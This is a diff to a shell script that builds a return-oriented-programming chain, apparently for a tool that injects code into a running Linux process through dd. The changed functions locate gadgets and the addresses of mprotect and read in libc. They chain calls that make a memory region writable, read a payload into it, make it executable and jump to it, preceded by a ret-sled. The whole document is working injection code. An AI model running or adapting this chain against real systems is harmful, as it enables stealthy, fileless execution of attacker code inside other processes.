@@ -519,7 +519,7 @@ find_gadget()
     off=$((off / 2))
     off=$((off + $2 + 0x$3 - 1))
 
-    printf %016x $off
+    printf $(endian $(printf %016x $off))
 }
 craft_rop()
 {
@@ -536,49 +536,49 @@ craft_rop()
     local pop_rdx=$(find_gadget $text $text_off $dd_base "5ac3")
     local ret=$(find_gadget $text $text_off $dd_base "c3")
     local map_size=$(((0x$1 & (~0xfff)) + 0x1000))
-    map_size=$(printf %016x $map_size)
-
+    map_size=$(endian $(printf %016x $map_size))
+    base_addr=$(endian $base_addr)
 
     # Find address of mprotect() and read() in the libc
     local mprotect_offset=$(search_symbol $libc_path mprotect read)
     local read_offset=$(echo $mprotect_offset | cut -d' ' -f2)
     mprotect_offset=$(echo $mprotect_offset | cut -d' ' -f1)
     local mprotect_addr=$(($mprotect_offset + $libc_base))
-    mprotect_addr=$(printf "%016x" $mprotect_addr)
+    mprotect_addr=$(endian $(printf "%016x" $mprotect_addr))
     local read_addr=$(($read_offset + $libc_base))
-    read_addr=$(printf "%016x" $read_addr)
+    read_addr=$(endian $(printf "%016x" $read_addr))
 
     local rop=""
-    rop=${rop}$(endian $pop_rdi)
-    rop=${rop}$(endian $base_addr)
-    rop=${rop}$(endian $pop_rsi)
-    rop=${rop}$(endian $map_size)
-    rop=${rop}$(endian $pop_rdx)
-    rop=${rop}$(endian "0000000000000003") # RW
-    rop=${rop}$(endian $mprotect_addr)
+    rop=$rop$pop_rdi
+    rop=$rop$base_addr
+    rop=$rop$pop_rsi
+    rop=$rop$map_size
+    rop=$rop$pop_rdx
+    rop=$rop"0300000000000000" # RW
+    rop=$rop$mprotect_addr
 
-    rop=${rop}$(endian $pop_rdi)
-    rop=${rop}"0000000000000000"
-    rop=${rop}$(endian $pop_rsi)
-    rop=${rop}$(endian $base_addr)
-    rop=${rop}$(endian $pop_rdx)
-    rop=${rop}$(endian $1)
-    rop=${rop}$(endian $read_addr)
+    rop=$rop$pop_rdi
+    rop=$rop"0000000000000000"
+    rop=$rop$pop_rsi
+    rop=$rop$base_addr
+    rop=$rop$pop_rdx
+    rop=$rop$(endian $1)
+    rop=$rop$read_addr
 
-    rop=${rop}$(endian $pop_rdi)
-    rop=${rop}$(endian $base_addr)
-    rop=${rop}$(endian $pop_rsi)
-    rop=${rop}$(endian $map_size)
-    rop=${rop}$(endian $pop_rdx)
-    rop=${rop}$(endian "0000000000000005") # R X
-    rop=${rop}$(endian $mprotect_addr)
+    rop=$rop$pop_rdi
+    rop=$rop$base_addr
+    rop=$rop$pop_rsi
+    rop=$rop$map_size
+    rop=$rop$pop_rdx
+    rop=$rop"0500000000000000" # R X
+    rop=$rop$mprotect_addr
 
-    rop=${rop}$(endian $base_addr)
+    rop=$rop$base_addr
 
     local retsled=""
     for i in $(seq $(((4096 - ${#rop} / 2) / 8)))
     do
-        retsled=${retsled}$(endian $ret)
+        retsled=$retsled$ret
     done
     echo -n $retsled$rop
 }
